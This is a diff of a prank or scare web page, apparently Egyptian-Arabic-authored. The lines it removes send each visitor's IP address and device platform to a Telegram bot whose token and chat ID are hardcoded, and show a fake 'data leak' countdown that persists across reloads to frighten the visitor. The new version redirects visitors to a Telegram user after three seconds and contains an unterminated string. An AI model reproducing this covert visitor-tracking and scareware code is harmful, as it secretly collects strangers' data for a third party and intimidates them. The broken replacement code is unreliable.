@@ -2,66 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM BREACH</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
     <style>
-        body { background: black; color: red; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .message { font-size: 35px; font-weight: bold; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
-        #timer { font-size: 100px; margin-top: 20px; text-shadow: 0 0 15px red; }
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-transform: uppercase;
+        }
+        .leave-text {
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+            border: 2px solid #fff;
+            padding: 20px;
+            box-shadow: 0 0 15px #fff;
+        }
     </style>
 </head>
 <body>
 
-    <div class="message">Data Leak in Progress...</div>
-    <div id="timer">05:00</div>
+    <div class="leave-text">Leave the website</div>
 
     <script>
-        // بياناتك يا حمو (جاهزة وشغالة)
-        const botToken = "8567916942:AAGL4UzNP8rnS_hYnxCvN3eRPJAMWv8qQtI";
-        const chatId = "8183132630";
+        
+        const message = "خلاص طلعت;
+        const telegramUrl = "https://t.me/elharm504?text=" + encodeURIComponent(message);
 
-        // 1. إرسال البيانات فوراً للتليجرام
-        async function reportToHamo() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const ipData = await res.json();
-                
-                const report = `🚨 TARGET CAUGHT!\n🌐 IP: ${ipData.ip}\n📱 Device: ${navigator.platform}\n⏳ Countdown Started!`;
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
-            } catch (e) { console.log("System Ready"); }
-        }
 
-        // 2. العداد الذكي (مش بيبدأ من الأول مع الريفرش)
-        function startPersistentTimer() {
-            let duration = 5 * 60; 
-            let startTime = localStorage.getItem('leak_start_time');
-
-            if (!startTime) {
-                startTime = Math.floor(Date.now() / 1000);
-                localStorage.setItem('leak_start_time', startTime);
-            }
-
-            const display = document.querySelector('#timer');
-            
-            setInterval(() => {
-                let now = Math.floor(Date.now() / 1000);
-                let remaining = duration - (now - startTime);
-
-                if (remaining <= 0) {
-                    display.innerHTML = "00:00";
-                    document.querySelector('.message').innerHTML = "ALL DATA LEAKED ✅";
-                    return;
-                }
-
-                let mins = Math.floor(remaining / 60);
-                let secs = remaining % 60;
-                display.innerHTML = `${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`;
-            }, 1000);
-        }
-
-        // تشغيل المهمة
-        reportToHamo();
-        startPersistentTimer();
+        setTimeout(function() {
+            window.location.href = telegramUrl;
+        }, 3000);
     </script>
+
 </body>
 </html>
